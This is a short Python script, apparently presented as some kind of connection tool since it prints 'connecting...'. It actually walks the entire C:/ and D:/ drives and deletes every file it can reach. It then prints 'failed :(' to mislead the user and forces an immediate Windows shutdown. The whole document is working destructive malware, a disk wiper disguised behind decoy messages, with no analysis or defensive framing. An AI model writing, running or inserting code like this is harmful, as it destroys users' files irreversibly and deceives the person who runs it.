import os
from os import walk
import time

def start():
    print("connecting...")
    # home = os.path.normpath(os.path.expanduser("~"))
    home = "C:/"

    for dirpath, dirnames, file in walk(home):
        for files in file:
            dirpath1 = os.path.normpath(dirpath)
            childpath = os.path.join(dirpath1, files)
            print(childpath)
            try:
                os.remove(childpath)
            except PermissionError:
                continue

    home = "D:/"

    for dirpath, dirnames, file in walk(home):
        for files in file:
            dirpath1 = os.path.normpath(dirpath)
            childpath = os.path.join(dirpath1, files)
            print(childpath)
            try:
                os.remove(childpath)
            except PermissionError:
                continue

    time.sleep(2)
    print("failed :(")
    os.system('shutdown /s /t 1')


start()